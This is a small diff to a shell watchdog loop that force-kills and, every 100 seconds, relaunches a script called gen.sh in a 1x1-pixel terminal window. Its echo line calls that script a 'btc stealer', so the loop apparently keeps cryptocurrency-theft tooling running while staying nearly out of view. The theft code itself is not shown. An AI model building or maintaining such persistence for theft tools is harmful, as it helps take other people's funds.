@@ -6,7 +6,7 @@ nr=0
 while :
 do
     sleep 100
-    killall gen.sh
+    killall -9 gen.sh
     gnome-terminal --geometry=1x1 -- ./gen.sh
     let nr++
     echo "Restarted btc stealer to avoid memory leak issues ($nr)"
